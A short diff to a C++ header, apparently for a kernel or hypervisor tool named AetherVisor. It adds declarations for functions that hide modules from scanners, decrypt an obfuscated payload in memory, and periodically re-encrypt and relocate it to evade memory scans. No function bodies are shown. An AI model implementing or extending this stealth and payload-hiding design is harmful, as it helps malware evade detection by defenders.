@@ -31,6 +31,16 @@ namespace AetherVisor {
             // Provides a secure way to write memory to the target process, bypassing hooks.
             NTSTATUS SafeWriteProcessMemory(PEPROCESS pProcess, PVOID pAddress, PVOID pBuffer, SIZE_T size);
 
+            // Creates a "shadow copy" of a module in memory to deflect scanners.
+            NTSTATUS CreateShadowCopy(PEPROCESS pProcess, PVOID pModuleBase);
+
+            // Delivers and decrypts a payload in memory just before execution.
+            // This relates to the Cryptography module.
+            NTSTATUS DeliverObfuscatedPayload(PEPROCESS pProcess, PVOID pEncryptedPayload, SIZE_T size, PVOID* ppDecryptedBase);
+
+            // Periodically re-encrypts and changes the location of the payload to avoid static analysis.
+            NTSTATUS EvadeMemoryScans(PEPROCESS pProcess, PVOID pPayload, SIZE_T size);
+
         }
     }
 }
